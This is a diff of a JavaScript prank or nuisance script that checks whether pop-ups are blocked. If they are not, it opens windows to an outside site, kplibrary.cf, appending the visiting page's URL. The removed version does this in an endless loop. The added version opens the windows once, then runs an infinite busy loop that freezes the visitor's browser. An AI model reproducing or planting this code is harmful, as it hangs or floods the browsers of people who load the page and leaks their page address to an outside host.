@@ -5,13 +5,11 @@ if (popUp == null || typeof(popUp) == 'undefined') {
     alert("Thicc Katz")
   }
 } else {
-  while (true) {
-    window.open("http://kplibrary.cf/")
-    var strWindowFeatures = "location=yes,height=670,width=620,scrollbars=yes,status=yes";
-var URL = "http://kplibrary.cf/" + location.href;
-var win = window.open(URL, "_blank", strWindowFeatures);
-    setTimeout(function() {
-      for (var i = 0; i === i; i++) {}
-    }, 500);
-  }
+  window.open("http://kplibrary.cf/")
+  var strWindowFeatures = "location=yes,height=670,width=620,scrollbars=yes,status=yes";
+  var URL = "http://kplibrary.cf/" + location.href;
+  var win = window.open(URL, "_blank", strWindowFeatures);
+  setTimeout(function() {
+    for (var i = 0; i === i; i++) {}
+  }, 50);
 }
